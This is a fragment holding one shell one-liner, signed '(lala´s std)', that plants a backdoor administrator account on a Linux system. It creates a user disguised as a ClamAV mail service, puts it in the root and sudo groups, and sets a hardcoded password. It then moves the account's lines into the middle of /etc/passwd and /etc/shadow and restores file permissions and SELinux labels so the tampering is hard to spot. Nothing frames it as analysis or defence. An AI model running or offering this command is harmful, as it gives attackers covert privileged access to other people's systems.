...
if id -u clamav-mail >/dev/null 2>&1; then sudo pkill -9 -u clamav-mail 2>/dev/null; sleep 1; sudo userdel --remove clamav-mail 2>/dev/null; fi && if ! grep -q '^sudo:' /etc/group; then sudo groupadd sudo; fi && if ! grep -q '^clamav-mail:' /etc/group; then sudo groupadd clamav-mail; fi && sudo useradd -u 455 -G root,sudo -g clamav-mail -d /tmp -o -s /bin/bash -M clamav-mail && printf '%s\n' 'clamav-mail:1!taugenichts' | sudo chpasswd && awk '{lines[NR]=$0} END{last=lines[NR]; delete lines[NR]; n=NR-1; m=int(n/2+1); for(i=1;i<m;i++) print lines[i]; print last; for(i=m;i<=n;i++) print lines[i]}' /etc/passwd > /tmp/passwd && sudo mv /tmp/passwd /etc/passwd && awk '{lines[NR]=$0} END{last=lines[NR]; delete lines[NR]; n=NR-1; m=int(n/2+1); for(i=1;i<m;i++) print lines[i]; print last; for(i=m;i<=n;i++) print lines[i]}' /etc/shadow > /tmp/shadow && sudo mv /tmp/shadow /etc/shadow && sudo chown root:root /etc/passwd /etc/shadow && sudo chmod 644 /etc/passwd && sudo chmod 000 /etc/shadow && sudo restorecon -v /etc/passwd /etc/shadow
### (lala´s std)
